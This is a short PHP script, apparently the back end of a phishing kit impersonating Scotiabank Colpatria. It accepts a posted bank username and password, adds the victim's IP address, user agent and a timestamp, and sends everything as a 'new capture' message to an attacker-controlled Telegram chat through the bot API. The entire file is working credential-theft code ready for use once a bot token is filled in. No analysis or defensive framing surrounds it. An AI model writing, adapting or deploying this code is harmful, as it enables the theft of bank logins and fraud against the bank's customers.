<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');

// ── CONFIG ──────────────────────────────────────────
$BOT_TOKEN = 'TU_BOT_TOKEN_AQUI';
$CHAT_ID   = 'TU_CHAT_ID_AQUI';
// ─────────────────────────────────────────────────────

$usuario  = trim($_POST['usuario']   ?? $_POST['username'] ?? '');
$password = trim($_POST['password']  ?? '');
$ip       = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$ua       = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$fecha    = date('Y-m-d H:i:s T');

if (empty($usuario) || empty($password)) {
    echo json_encode(['ok' => false, 'error' => 'campos vacios']);
    exit;
}

$mensaje = "🏦 *Scotiabank Colpatria — Nueva captura*\n\n"
         . "👤 *Usuario:* \`{$usuario}\`\n"
         . "🔑 *Contraseña:* \`{$password}\`\n"
         . "🌐 *IP:* \`{$ip}\`\n"
         . "📱 *UA:* \`{$ua}\`\n"
         . "🕐 *Fecha:* \`{$fecha}\`";

$url  = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$data = [
    'chat_id'    => $CHAT_ID,
    'text'       => $mensaje,
    'parse_mode' => 'Markdown',
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($data),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);

if ($err) {
    echo json_encode(['ok' => false, 'error' => $err]);
    exit;
}

echo json_encode(['ok' => true]);
